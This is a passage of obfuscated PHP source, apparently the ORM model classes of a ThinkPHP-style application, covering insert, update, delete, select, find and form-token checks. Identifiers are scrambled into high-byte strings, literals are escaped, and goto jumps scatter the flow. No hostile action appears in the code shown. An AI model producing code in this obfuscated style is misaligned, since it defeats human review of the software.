Í›¹Â£[2420]; $this->field = array($ Í›¹Â£[2421], $ Í›¹Â£[32], $ Í›¹Â£[197], $ Í›¹Â£[33], $ Í›¹Â£[2422], $ Í›¹Â£[795], $ Í›¹Â£[217]); } public function userNoticeGet($Ğô™Ç² = false) { $this->initUserOption(); return parent::listData($Ğô™Ç², $_SERVER[³à¼î¯á][450], !0); } public function userNoticeAdd($ã½Õë§) { $Ğ°ê€æÆ =& $_SERVER[³à¼î¯á]; $this->initUserOption(); $ˆşÁ—ü¬ = $this->findByKey($Ğ°ê€æÆ[2421], $ã½Õë§[$Ğ°ê€æÆ[450]]); if ($ˆşÁ—ü¬) { return !0; } $¬éÎÜŸé = array($Ğ°ê€æÆ[2421] => $ã½Õë§[$Ğ°ê€æÆ[450]], $Ğ°ê€æÆ[32] => $ã½Õë§[$Ğ°ê€æÆ[32]], $Ğ°ê€æÆ[197] => $ã½Õë§[$Ğ°ê€æÆ[197]], $Ğ°ê€æÆ[33] => isset($ã½Õë§[$Ğ°ê€æÆ[33]]) ? $ã½Õë§[$Ğ°ê€æÆ[33]] : 1, $Ğ°ê€æÆ[2422] => isset($ã½Õë§[$Ğ°ê€æÆ[2422]]) ? $ã½Õë§[$Ğ°ê€æÆ[2422]] : 0, $Ğ°ê€æÆ[795] => 0, $Ğ°ê€æÆ[217] => 0); return parent::insert($¬éÎÜŸé); } public function userNoticeEdit($™Ú“‹ÔÆ, $ÙÈ¿Şçî) { $this->initUserOption(); return parent::update($™Ú“‹ÔÆ, $ÙÈ¿Şçî); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\145\155\x5f\157\x70\164\x69\x6f\x6e"; protected $jsonField = array("\x6d\145\156\x75", "\162\157\154\x65", "\162\157\154\145\x47\x72\157\x75\160", "\162\145\147\151\163\x74", "\145\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ì«Î‘Şó) { return "\x53\171\x73\x74\x65\x6d\117\x70\x74\x69\157\156\x5f{$ì«Î‘Şó}"; } protected function optionDefault($ÇÛ‹Ô = '') { $ë›±İª =& $_SERVER[³à¼î¯á]; if ($ÇÛ‹Ô == $ë›±İª[12]) { return $GLOBALS[$ë›±İª[6]][$ë›±İª[432]]; } } } goto b”°ãÌƒøä; a—Ç°«×à: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\145", "\157\x72\x64\x65\162", "\x61\x6c\x69\x61\x73", "\x68\x61\166\151\x6e\147", "\147\x72\x6f\165\160", "\x6c\157\x63\x6b", "\x64\151\163\164\x69\x6e\x63\164", "\141\x75\x74\157", "\x66\x69\x6c\164\x65\x72", "\166\141\154\x69\144\141\164\145", "\162\145\163\x75\154\x74", "\x62\x69\x6e\x64", "\x74\157\153\145\156"); public function __construct($Ş€Ãˆ·Ã = '', $öæÌ÷¯» = '', $–Î½ŠàŒ = '') { $¦¦Ÿ¹ƒÖ =& $_SERVER[³à¼î¯á]; $this->_initialize(); if (!empty($Ş€Ãˆ·Ã)) { if (strpos($Ş€Ãˆ·Ã, $¦¦Ÿ¹ƒÖ[10])) { list($this->dbName, $this->name) = explode($¦¦Ÿ¹ƒÖ[10], $Ş€Ãˆ·Ã); } else { $this->name = $Ş€Ãˆ·Ã; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($öæÌ÷¯»)) { $this->tablePrefix = $¦¦Ÿ¹ƒÖ[12]; } elseif ($¦¦Ÿ¹ƒÖ[12] != $öæÌ÷¯») { $this->tablePrefix = $öæÌ÷¯»; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¦¦Ÿ¹ƒÖ[296]); } $this->db(0, empty($this->connection) ? $–Î½ŠàŒ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $‰ßˆÀÙÜ =& $_SERVER[³à¼î¯á]; if (empty($this->fields)) { if (think_config($‰ßˆÀÙÜ[297])) { $§½Õıëù = $this->dbName ? $this->dbName : think_config($‰ßˆÀÙÜ[298]); $ºˆÎ¤Õ = think_var_cache($‰ßˆÀÙÜ[299] . strtolower(get_path_this($§½Õıëù) . $‰ßˆÀÙÜ[10] . $this->name)); if ($ºˆÎ¤Õ) { $‡ÁÃïöÃ = think_config($‰ßˆÀÙÜ[300]); if (empty($‡ÁÃïöÃ) || $ºˆÎ¤Õ[$‰ßˆÀÙÜ[301]] == $‡ÁÃïöÃ) { $this->fields = $ºˆÎ¤Õ; return; } } } $this->flush(); } } public function flush() { $şá‹“ø‰ =& $_SERVER[³à¼î¯á]; $this->db->setModel($this->name); $†Í·À»Æ = $this->db->getFields($this->getTableName()); if (!$†Í·À»Æ) { return !1; } $this->fields = array_keys($†Í·À»Æ); $this->fields[$şá‹“ø‰[302]] = !1; foreach ($†Í·À»Æ as $¸ã“æÚë => $Åå˜Ûœô) { $™õâ‰ê‡[$¸ã“æÚë] = $Åå˜Ûœô[$şá‹“ø‰[33]]; if ($Åå˜Ûœô[$şá‹“ø‰[39]]) { $this->fields[$şá‹“ø‰[303]] = $¸ã“æÚë; if ($Åå˜Ûœô[$şá‹“ø‰[42]]) { $this->fields[$şá‹“ø‰[302]] = !0; } } } $this->fields[$şá‹“ø‰[304]] = $™õâ‰ê‡; if (think_config($şá‹“ø‰[300])) { $this->fields[$şá‹“ø‰[301]] = think_config($şá‹“ø‰[300]); } if (think_config($şá‹“ø‰[297])) { $“²¾í™ = $this->dbName ? $this->dbName : think_config($şá‹“ø‰[298]); think_var_cache($şá‹“ø‰[299] . strtolower(get_path_this($“²¾í™) . $şá‹“ø‰[10] . $this->name), $this->fields); } } public function switchModel($¢éßŸ®Í, $ş³¶ü¾Å = array()) { $ö‰ÈÌ† =& $_SERVER[³à¼î¯á]; $Ğ†…ª Ÿ = ucwords(strtolower($¢éßŸ®Í)) . $ö‰ÈÌ†[305]; if (!class_exists($Ğ†…ª Ÿ)) { think_exception($Ğ†…ª Ÿ . think_lang($ö‰ÈÌ†[306])); } $this->_extModel = new $Ğ†…ª Ÿ($this->name); if (!empty($ş³¶ü¾Å)) { foreach ($ş³¶ü¾Å as $ÔÉöÕÅû) { $this->_extModel->setProperty($ÔÉöÕÅû, $this->{$ÔÉöÕÅû}); } } return $this->_extModel; } public function __set($ÂìÛºô, $Í¬®‰) { $this->data[$ÂìÛºô] = $Í¬®‰; } public function __get($±¥Á£Áá) { return isset($this->data[$±¥Á£Áá]) ? $this->data[$±¥Á£Áá] : null; } public function __isset($³î´ˆ§¶) { return isset($this->data[$³î´ˆ§¶]); } public function __unset($µüşÜ) { unset($this->data[$µüşÜ]); } public function __call($½´¢¬Èº, $ÙıÖÄí“) { $¦Ä…—İ¯ =& $_SERVER[³à¼î¯á]; if (in_array(strtolower($½´¢¬Èº), $this->methods, !0)) { $this->options[strtolower($½´¢¬Èº)] = $ÙıÖÄí“[0]; return $this; } elseif (in_array(strtolower($½´¢¬Èº), array($¦Ä…—İ¯[307], $¦Ä…—İ¯[308], $¦Ä…—İ¯[309], $¦Ä…—İ¯[310], $¦Ä…—İ¯[311]), !0)) { $æ•ÙÕú = isset($ÙıÖÄí“[0]) ? $ÙıÖÄí“[0] : $¦Ä…—İ¯[211]; $æ•ÙÕú = $this->db->parseKey($æ•ÙÕú); return $this->getField(strtoupper($½´¢¬Èº) . $¦Ä…—İ¯[312] . $æ•ÙÕú . $¦Ä…—İ¯[313] . $½´¢¬Èº, $¦Ä…—İ¯[307]); } elseif (strtolower(substr($½´¢¬Èº, 0, 5)) == $¦Ä…—İ¯[314]) { $æ•ÙÕú = think_parse_name(substr($½´¢¬Èº, 5)); $³ûşŠÁÂ[$æ•ÙÕú] = $ÙıÖÄí“[0]; return $this->where($³ûşŠÁÂ)->find(); } elseif (strtolower(substr($½´¢¬Èº, 0, 10)) == $¦Ä…—İ¯[315]) { $ééòú–µ = think_parse_name(substr($½´¢¬Èº, 10)); $³ûşŠÁÂ[$ééòú–µ] = $ÙıÖÄí“[0]; return $this->where($³ûşŠÁÂ)->getField($ÙıÖÄí“[1]); } elseif (isset($this->_scope[$½´¢¬Èº])) { return $this->scope($½´¢¬Èº, $ÙıÖÄí“[0]); } elseif (method_exists($this, $½´¢¬Èº)) { array_unshift($ÙıÖÄí“, $½´¢¬Èº); return call_user_func_array(array($this, $¦Ä…—İ¯[316]), $ÙıÖÄí“); } else { return call_user_func_array(array(parent, $½´¢¬Èº), $ÙıÖÄí“); } } protected function call() { $â÷ùÁº× =& $_SERVER[³à¼î¯á]; $ÂÉ¶Ôõ‰ = func_get_args(); $¶Š»Ï¨’ = array_shift($ÂÉ¶Ôõ‰); $–¯Æ¾¬ = $¶Š»Ï¨’; if (is_array($¶Š»Ï¨’)) { $–¯Æ¾¬ = $¶Š»Ï¨’[1]; $¶Š»Ï¨’ = $¶Š»Ï¨’[0]; } $Šú°‚§ = count($ÂÉ¶Ôõ‰) - 1; if (isset($ÂÉ¶Ôõ‰[$Šú°‚§]) && $ÂÉ¶Ôõ‰[$Šú°‚§] === $¶Š»Ï¨’) { think_exception(__CLASS__ . $â÷ùÁº×[4] . $¶Š»Ï¨’ . think_lang($â÷ùÁº×[317])); return; } $ÂÉ¶Ôõ‰[] = $¶Š»Ï¨’; if (method_exists($this, $â÷ùÁº×[318])) { $´åã×†ç = call_user_func_array(array($this, $â÷ùÁº×[319]), array($–¯Æ¾¬, $ÂÉ¶Ôõ‰)); if (!is_null($´åã×†ç) && $´åã×†ç !== !1) { return $´åã×†ç; } } $Ò‚Ì¤¾ê = call_user_func_array(array($this, $¶Š»Ï¨’), $ÂÉ¶Ôõ‰); if (method_exists($this, $â÷ùÁº×[320])) { $´åã×†ç = call_user_func_array(array($this, $â÷ùÁº×[321]), array($–¯Æ¾¬, $ÂÉ¶Ôõ‰, $Ò‚Ì¤¾ê)); if ($´åã×†ç) { return $´åã×†ç; } } return $Ò‚Ì¤¾ê; } protected function _initialize() { } protected function _facade($îÖ¥â‹›) { $æä¼‘ÜÒ =& $_SERVER[³à¼î¯á]; if (!empty($this->fields)) { foreach ($îÖ¥â‹› as $ôñäâƒ => $¨˜ä‰´) { if (is_array($this->fields) && !in_array($ôñäâƒ, $this->fields, !0)) { unset($îÖ¥â‹›[$ôñäâƒ]); } elseif (is_scalar($¨˜ä‰´)) { $this->_parseType($îÖ¥â‹›, $ôñäâƒ); } } } if (!empty($this->options[$æä¼‘ÜÒ[322]])) { $îÖ¥â‹› = array_map($this->options[$æä¼‘ÜÒ[322]], $îÖ¥â‹›); unset($this->options[$æä¼‘ÜÒ[322]]); } $this->_beforeWrite($îÖ¥â‹›); return $îÖ¥â‹›; } protected function _beforeWrite(&$¨˜ÖÊ») { } public function add($Ñ®ÕïÀ = '', $¿‚êá¶ô = array(), $˜ï¤Îİ¶ = false) { if (empty($Ñ®ÕïÀ)) { if (!empty($this->data)) { $Ñ®ÕïÀ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[³à¼î¯á][323]); return !1; } } $¿‚êá¶ô = $this->_parseOptions($¿‚êá¶ô); $Ñ®ÕïÀ = $this->_facade($Ñ®ÕïÀ); if (!1 === $this->_beforeInsert($Ñ®ÕïÀ, $¿‚êá¶ô)) { return !1; } $ù–­¥¿² = $this->db->insert($Ñ®ÕïÀ, $¿‚êá¶ô, $˜ï¤Îİ¶); if (!1 !== $ù–­¥¿²) { $É±É©õÂ = $this->getLastInsID(); if ($É±É©õÂ) { $Ñ®ÕïÀ[$this->getPk()] = $É±É©õÂ; $this->_after_insert($Ñ®ÕïÀ, $¿‚êá¶ô); return $É±É©õÂ; } $this->_after_insert($Ñ®ÕïÀ, $¿‚êá¶ô); } return $ù–­¥¿²; } protected function _beforeInsert(&$ ìÖÅº³, $‘¶Ø‡õ­) { } protected function _after_insert($½Öœ©·Ñ, $ˆ…ÚÄäØ) { } public function addAll($â¾ùè®, $şñáÏÇ = array(), $ñŠÆÃÙ = false) { $¦½Ûûõ¦ =& $_SERVER[³à¼î¯á]; if (empty($â¾ùè®)) { $this->error = think_lang($¦½Ûûõ¦[323]); return !1; } $şñáÏÇ = $this->_parseOptions($şñáÏÇ); foreach ($â¾ùè® as $òï§Î…ˆ => $åçğß¶œ) { $â¾ùè®[$òï§Î…ˆ] = $this->_facade($åçğß¶œ); } if (method_exists($this->db, $¦½Ûûõ¦[324])) { $ĞĞ½°Ä = $this->db->insertAll($â¾ùè®, $şñáÏÇ, $ñŠÆÃÙ); } else { $this->startTrans(); foreach ($â¾ùè® as $òï§Î…ˆ => $åçğß¶œ) { $ĞĞ½°Ä = $this->db->insert($åçğß¶œ, $şñáÏÇ, $ñŠÆÃÙ); } $this->commit(); } if (!1 !== $ĞĞ½°Ä) { $À§ğğ‰ã = $this->getLastInsID(); if ($À§ğğ‰ã) { return $À§ğğ‰ã; } } return $ĞĞ½°Ä; } public function selectAdd($å»¦òü‚ = '', $Œ™–±›€ = '', $¦Úœü© = array()) { $Õõ¿„Ÿ =& $_SERVER[³à¼î¯á]; $¦Úœü© = $this->_parseOptions($¦Úœü©); if (!1 === ($®ğ´ª¼ƒ = $this->db->selectInsert($å»¦òü‚ ? $å»¦òü‚ : $¦Úœü©[$Õõ¿„Ÿ[325]], $Œ™–±›€ ? $Œ™–±›€ : $this->getTableName(), $¦Úœü©))) { $this->error = think_lang($Õõ¿„Ÿ[326]); return !1; } else { return $®ğ´ª¼ƒ; } } public function save($‰™¡ñû¤ = '', $ƒø±â› = array()) { $ù½É©– =& $_SERVER[³à¼î¯á]; if (empty($‰™¡ñû¤)) { if (!empty($this->data)) { $‰™¡ñû¤ = $this->data; $this->data = array(); } else { $this->error = think_lang($ù½É©–[323]); return !1; } } $‰™¡ñû¤ = $this->_facade($‰™¡ñû¤); $ƒø±â› = $this->_parseOptions($ƒø±â›); $³ßë°±£ = $this->getPk(); if (!isset($ƒø±â›[$ù½É©–[327]])) { if (isset($‰™¡ñû¤[$³ßë°±£])) { $œŸ’úï[$³ßë°±£] = $‰™¡ñû¤[$³ßë°±£]; $ƒø±â›[$ù½É©–[327]] = $œŸ’úï; unset($‰™¡ñû¤[$³ßë°±£]); } else { $this->error = think_lang($ù½É©–[326]); return !1; } } if (is_array($ƒø±â›[$ù½É©–[327]]) && isset($ƒø±â›[$ù½É©–[327]][$³ßë°±£])) { $êæå¬ë° = $ƒø±â›[$ù½É©–[327]][$³ßë°±£]; } if (!1 === $this->_beforeUpdate($‰™¡ñû¤, $ƒø±â›)) { return !1; } $œ°€æäì = $this->db->update($‰™¡ñû¤, $ƒø±â›); if (!1 !== $œ°€æäì) { if (isset($êæå¬ë°)) { $‰™¡ñû¤[$³ßë°±£] = $êæå¬ë°; } $this->_afterUpdate($‰™¡ñû¤, $ƒø±â›); } return $œ°€æäì; } protected function _beforeUpdate(&$·Ò„œ‘, $½ôş€ßï) { } protected function _afterUpdate($³º³æ–ï, $š‘ÅÌš) { } public function delete($Œñô£Ä = array()) { $ë„Î¯‚¾ =& $_SERVER[³à¼î¯á]; if (empty($Œñô£Ä) && empty($this->options[$ë„Î¯‚¾[327]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ÃÉÖ”Ë¤ = $this->getPk(); if (is_numeric($Œñô£Ä) || is_string($Œñô£Ä)) { if (strpos($Œñô£Ä, $ë„Î¯‚¾[50])) { $®ˆüÒ É[$ÃÉÖ”Ë¤] = array($ë„Î¯‚¾[328], $Œñô£Ä); } else { $®ˆüÒ É[$ÃÉÖ”Ë¤] = $Œñô£Ä; } $this->options[$ë„Î¯‚¾[327]] = $®ˆüÒ É; } $Œñô£Ä = $this->_parseOptions(); if (is_array($Œñô£Ä[$ë„Î¯‚¾[327]]) && isset($Œñô£Ä[$ë„Î¯‚¾[327]][$ÃÉÖ”Ë¤])) { $ŒÕûúˆ‡ = $Œñô£Ä[$ë„Î¯‚¾[327]][$ÃÉÖ”Ë¤]; } $óÀøó¤ = $this->db->delete($Œñô£Ä); if (!1 !== $óÀøó¤) { $Ù§Ë = array(); if (isset($ŒÕûúˆ‡)) { $Ù§Ë[$ÃÉÖ”Ë¤] = $ŒÕûúˆ‡; } $this->_after_delete($Ù§Ë, $Œñô£Ä); } return $óÀøó¤; } protected function _after_delete($®‘Âº£, $ÂŒÈû) { } public function select($ÌºßÌÈ‡ = array()) { $áÌêÜ¸À =& $_SERVER[³à¼î¯á]; if (is_string($ÌºßÌÈ‡) || is_numeric($ÌºßÌÈ‡)) { $Í‡ì•ã¾ = $this->getPk(); if (strpos($ÌºßÌÈ‡, $áÌêÜ¸À[50])) { $µÉßÚÌŠ[$Í‡ì•ã¾] = array($áÌêÜ¸À[328], $ÌºßÌÈ‡); } else { $µÉßÚÌŠ[$Í‡ì•ã¾] = $ÌºßÌÈ‡; } $this->options[$áÌêÜ¸À[327]] = $µÉßÚÌŠ; } elseif (!1 === $ÌºßÌÈ‡) { $ÌºßÌÈ‡ = $this->_parseOptions(); return $áÌêÜ¸À[329] . $this->db->buildSelectSql($ÌºßÌÈ‡) . $áÌêÜ¸À[330]; } $ÌºßÌÈ‡ = $this->_parseOptions(); $¸ÏÅõ· = $this->db->select($ÌºßÌÈ‡); if (!1 === $¸ÏÅõ·) { return !1; } if (empty($¸ÏÅõ·)) { return null; } $this->_afterSelect($¸ÏÅõ·, $ÌºßÌÈ‡); return $¸ÏÅõ·; } protected function _afterSelect(&$Ô»”ùíì, $¸»£Ä®¢) { } public function buildSql($‹ğ€‰çÇ = array()) { $Çº‚×¶ =& $_SERVER[³à¼î¯á]; $‹ğ€‰çÇ = $this->_parseOptions($‹ğ€‰çÇ); return $Çº‚×¶[329] . $this->db->buildSelectSql($‹ğ€‰çÇ) . $Çº‚×¶[330]; } public function optionsValue($¬¡Ã¾Ãş = null) { if (is_null($¬¡Ã¾Ãş)) { return $this->options; } elseif (is_array($¬¡Ã¾Ãş)) { $this->options = array_merge($this->options, $¬¡Ã¾Ãş); } } protected function _parseOptions($Ÿ¸ëæ·Ê = array()) { $ªÏºàâÑ =& $_SERVER[³à¼î¯á]; if (is_array($Ÿ¸ëæ·Ê)) { $Ÿ¸ëæ·Ê = array_merge($this->options, $Ÿ¸ëæ·Ê); } $this->options = array(); if (!isset($Ÿ¸ëæ·Ê[$ªÏºàâÑ[331]])) { $Ÿ¸ëæ·Ê[$ªÏºàâÑ[331]] = $this->getTableName(); $™£ùËÓâ = $this->fields; } else { $™£ùËÓâ = $this->getDbFields(); } if (!empty($Ÿ¸ëæ·Ê[$ªÏºàâÑ[332]])) { $Ÿ¸ëæ·Ê[$ªÏºàâÑ[331]] .= $ªÏºàâÑ[53] . $Ÿ¸ëæ·Ê[$ªÏºàâÑ[332]]; } $Ÿ¸ëæ·Ê[$ªÏºàâÑ[333]] = $this->name; if (isset($Ÿ¸ëæ·Ê[$ªÏºàâÑ[327]]) && is_array($Ÿ¸ëæ·Ê[$ªÏºàâÑ[327]]) && !empty($™£ùËÓâ) && !isset($Ÿ¸ëæ·Ê[$ªÏºàâÑ[334]]) && !isset($Ÿ¸ëæ·Ê[$ªÏºàâÑ[331]])) { foreach ($Ÿ¸ëæ·Ê[$ªÏºàâÑ[327]] as $ò¥ûú => $éÀáÌ) { $ò¥ûú = trim($ò¥ûú); if (in_array($ò¥ûú, $™£ùËÓâ, !0)) { if (is_scalar($éÀáÌ)) { $this->_parseType($Ÿ¸ëæ·Ê[$ªÏºàâÑ[327]], $ò¥ûú); } } elseif (!is_numeric($ò¥ûú) && $ªÏºàâÑ[11] != substr($ò¥ûú, 0, 1) && !1 === strpos($ò¥ûú, $ªÏºàâÑ[10]) && !1 === strpos($ò¥ûú, $ªÏºàâÑ[312]) && !1 === strpos($ò¥ûú, $ªÏºàâÑ[205]) && !1 === strpos($ò¥ûú, $ªÏºàâÑ[335])) { unset($Ÿ¸ëæ·Ê[$ªÏºàâÑ[327]][$ò¥ûú]); } } } $this->_options_filter($Ÿ¸ëæ·Ê); return $Ÿ¸ëæ·Ê; } protected function _options_filter(&$¢ûûˆÕ‘) { } protected function _parseType(&$Ã¦¤, $Ã˜çã‚) { $³ºÌóÎ =& $_SERVER[³à¼î¯á]; if (empty($this->options[$³ºÌóÎ[336]][$³ºÌóÎ[4] . $Ã˜çã‚])) { $¤¼‰¶ğë = strtolower($this->fields[$³ºÌóÎ[304]][$Ã˜çã‚]); if (!1 !== strpos($¤¼‰¶ğë, $³ºÌóÎ[337])) { } elseif (!1 === strpos($¤¼‰¶ğë, $³ºÌóÎ[338]) && !1 !== strpos($¤¼‰¶ğë, $³ºÌóÎ[339])) { $Ã¦¤[$Ã˜çã‚] = intval($Ã¦¤[$Ã˜çã‚]); } elseif (!1 !== strpos($¤¼‰¶ğë, $³ºÌóÎ[340]) || !1 !== strpos($¤¼‰¶ğë, $³ºÌóÎ[341])) { $Ã¦¤[$Ã˜çã‚] = floatval($Ã¦¤[$Ã˜çã‚]); } elseif (!1 !== strpos($¤¼‰¶ğë, $³ºÌóÎ[342])) { $Ã¦¤[$Ã˜çã‚] = (bool) $Ã¦¤[$Ã˜çã‚]; } } } public function find($æ™„ø™ = array()) { $¨ùêÅÊ =& $_SERVER[³à¼î¯á]; if (is_numeric($æ™„ø™) || is_string($æ™„ø™)) { $Á˜€ó¯£[$this->getPk()] = intval($æ™„ø™); $this->options[$¨ùêÅÊ[327]] = $Á˜€ó¯£; } $this->options[$¨ùêÅÊ[343]] = 1; $æ™„ø™ = $this->_parseOptions(); $ïÂÍ´ Ø = $this->db->select($æ™„ø™); if (!1 === $ïÂÍ´ Ø) { return !1; } if (empty($ïÂÍ´ Ø)) { return null; } $this->data = $ïÂÍ´ Ø[0]; $this->_afterFind($this->data, $æ™„ø™); if (!empty($this->options[$¨ùêÅÊ[344]])) { return $this->returnResult($this->data, $this->options[$¨ùêÅÊ[344]]); } return $this->data; } protected function _afterFind(&$ô‚‚ Ë‰, $õÀš­¶ì) { } protected function returnResult($’š§‘å, $ØÊ»µ¡ = '') { $èÌòÇï =& $_SERVER[³à¼î¯á]; if ($ØÊ»µ¡) { if (is_callable($ØÊ»µ¡)) { return call_user_func($ØÊ»µ¡, $’š§‘å); } switch (strtolower($ØÊ»µ¡)) { case $èÌòÇï[345]: return json_encode($’š§‘å); case $èÌòÇï[346]: return xml_encode($’š§‘å); } } return $’š§‘å; } public function parseFieldsMap($Ü»Á€Æ, $“°å›ÕŸ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ÿœıò‡­ => $¸ÕóÄ”) { if ($“°å›ÕŸ == 1) { if (isset($Ü»Á€Æ[$¸ÕóÄ”])) { $Ü»Á€Æ[$Ÿœıò‡­] = $Ü»Á€Æ[$¸ÕóÄ”]; unset($Ü»Á€Æ[$¸ÕóÄ”]); } } else { if (isset($Ü»Á€Æ[$Ÿœıò‡­])) { $Ü»Á€Æ[$¸ÕóÄ”] = $Ü»Á€Æ[$Ÿœıò‡­]; unset($Ü»Á€Æ[$Ÿœıò‡­]); } } } } return $Ü»Á€Æ; } public function setField($ºµí‡ÀÙ, $„Ûœ°ä  = '') { if (is_array($ºµí‡ÀÙ)) { $Ô½Èø³ = $ºµí‡ÀÙ; } else { $Ô½Èø³[$ºµí‡ÀÙ] = $„Ûœ°ä ; } return $this->save($Ô½Èø³); } public function setAdd($–­áüùƒ, $¡øì»« = 1) { $Åôï¶ó€ =& $_SERVER[³à¼î¯á]; $İ¨¨·ßÈ = $–­áüùƒ . $Åôï¶ó€[347] . $¡øì»«; if ($¡øì»« < 0) { $İ¨¨·ßÈ = $–­áüùƒ . $¡øì»«; } return $this->setField($–­áüùƒ, array($Åôï¶ó€[348], $İ¨¨·ßÈ)); } public function getField($Ÿå³ÀÌæ, $‚Üàéºğ = null) { $õŠî†ò­ =& $_SERVER[³à¼î¯á]; $âÇ©‘¼ó[$õŠî†ò­[325]] = $Ÿå³ÀÌæ; $âÇ©‘¼ó = $this->_parseOptions($âÇ©‘¼ó); $Ÿå³ÀÌæ = trim($Ÿå³ÀÌæ); if (strpos($Ÿå³ÀÌæ, $õŠî†ò­[50])) { if (!isset($âÇ©‘¼ó[$õŠî†ò­[343]])) { $âÇ©‘¼ó[$õŠî†ò­[343]] = is_numeric($‚Üàéºğ) ? $‚Üàéºğ : $õŠî†ò­[12]; } $°î¡¯à = $this->db->select($âÇ©‘¼ó); if (!empty($°î¡¯à)) { $¼¯‡Óš = explode($õŠî†ò­[50], $Ÿå³ÀÌæ); $Ÿå³ÀÌæ = array_keys($°î¡¯à[0]); $ëù¤Ï = array_shift($Ÿå³ÀÌæ); $‡›«µÄô = array_shift($Ÿå³ÀÌæ); $¨«Ü³°¢ = array(); $´ÌúÚ°Ã = count($¼¯‡Óš); foreach ($°î¡¯à as $·‘ëÆÇ¦) { $èÎ‹³Ï¢ = $·‘ëÆÇ¦[$ëù¤Ï]; if (2 == $´ÌúÚ°Ã) { $¨«Ü³°¢[$èÎ‹³Ï¢] = $·‘ëÆÇ¦[$‡›«µÄô]; } else { $¨«Ü³°¢[$èÎ‹³Ï¢] = is_string($‚Üàéºğ) ? implode($‚Üàéºğ, $·‘ëÆÇ¦) : $·‘ëÆÇ¦; } } return $¨«Ü³°¢; } } else { if (!0 !== $‚Üàéºğ) { $âÇ©‘¼ó[$õŠî†ò­[343]] = is_numeric($‚Üàéºğ) ? $‚Üàéºğ : 1; } if ($‚Üàéºğ === $õŠî†ò­[307]) { unset($âÇ©‘¼ó[$õŠî†ò­[343]]); } $·‘ëÆÇ¦ = $this->db->select($âÇ©‘¼ó); if (!empty($·‘ëÆÇ¦)) { if ($‚Üàéºğ === $õŠî†ò­[307]) { return reset($·‘ëÆÇ¦[0]); } if (!0 !== $‚Üàéºğ && 1 == $âÇ©‘¼ó[$õŠî†ò­[343]]) { return reset($·‘ëÆÇ¦[0]); } foreach ($·‘ëÆÇ¦ as $ş†î¡) { $³ÚĞşŞ’[] = $ş†î¡[$Ÿå³ÀÌæ]; } return $³ÚĞşŞ’; } } return null; } public function create($ãØ½˜Ü = '', $æ‹˜©÷ò = '') { $˜ˆÙãàß =& $_SERVER[³à¼î¯á]; if (empty($ãØ½˜Ü)) { $ãØ½˜Ü = $_POST; } elseif (is_object($ãØ½˜Ü)) { $ãØ½˜Ü = get_object_vars($ãØ½˜Ü); } if (empty($ãØ½˜Ü) || !is_array($ãØ½˜Ü)) { $this->error = think_lang($˜ˆÙãàß[323]); return !1; } $ãØ½˜Ü = $this->parseFieldsMap($ãØ½˜Ü, 0); $æ‹˜©÷ò = $æ‹˜©÷ò ? $æ‹˜©÷ò : (!empty($ãØ½˜Ü[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$˜ˆÙãàß[325]])) { $¬ı»Ù¿¶ = $this->options[$˜ˆÙãàß[325]]; unset($this->options[$˜ˆÙãàß[325]]); } elseif ($æ‹˜©÷ò == THINK_MODEL_INSERT && isset($this->insertFields)) { $¬ı»Ù¿¶ = $this->insertFields; } elseif ($æ‹˜©÷ò == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¬ı»Ù¿¶ = $this->updateFields; } if (isset($¬ı»Ù¿¶)) { if (is_string($¬ı»Ù¿¶)) { $¬ı»Ù¿¶ = explode($˜ˆÙãàß[50], $¬ı»Ù¿¶); } if (think_config($˜ˆÙãàß[349])) { $¬ı»Ù¿¶[] = think_config($˜ˆÙãàß[350]); } foreach ($ãØ½˜Ü as $ïšåïµ¿ => $†Æçî§ï) { if (!in_array($ïšåïµ¿, $¬ı»Ù¿¶)) { unset($ãØ½˜Ü[$ïšåïµ¿]); } } } if (!$this->autoValidation($ãØ½˜Ü, $æ‹˜©÷ò)) { return !1; } if (!$this->autoCheckToken($ãØ½˜Ü)) { $this->error = think_lang($˜ˆÙãàß[351]); return !1; } if ($this->autoCheckFields) { $¬ı»Ù¿¶ = $this->getDbFields(); foreach ($ãØ½˜Ü as $ïšåïµ¿ => $†Æçî§ï) { if (!in_array($ïšåïµ¿, $¬ı»Ù¿¶)) { unset($ãØ½˜Ü[$ïšåïµ¿]); } elseif (MAGIC_QUOTES_GPC && is_string($†Æçî§ï)) { $ãØ½˜Ü[$ïšåïµ¿] = stripslashes($†Æçî§ï); } } } $this->autoOperation($ãØ½˜Ü, $æ‹˜©÷ò); $this->data = $ãØ½˜Ü; return $ãØ½˜Ü; } public function autoCheckToken($åÅİŞ†´) { $İ¹ßªè­ =& $_SERVER[³à¼î¯á]; if (isset($this->options[$İ¹ßªè­[352]]) && !$this->options[$İ¹ßªè­[352]]) { return !0; } if (think_config($İ¹ßªè­[349])) { $éùÀ“ä‰ = think_config($İ¹ßªè­[350]); if (!isset($åÅİŞ†´[$éùÀ“ä‰]) || Session::get($éùÀ“ä‰)) { return !1; } list($×÷¹Øò, $êùìÚÎ) = explode($İ¹ßªè­[11], $åÅİŞ†´[$éùÀ“ä‰]); if ($êùìÚÎ && Session::get($éùÀ“ä‰ . $İ¹ßªè­[10] . $×÷¹Øò) === $êùìÚÎ) { Session::remove($éùÀ“ä‰ . $İ¹ßªè­[10] . $×÷¹Øò); return !0; } if (think_config($İ¹ßªè­[353])) { Session::remove($éùÀ“ä‰ . $İ¹ßªè­[10] . $×÷¹Øò); } return !1; } return !0; } public function regex($¦Ôçú´Ü, $î·»çÛ) { $Šı»¨Úû =& $_SERVER[³à¼î¯á]; 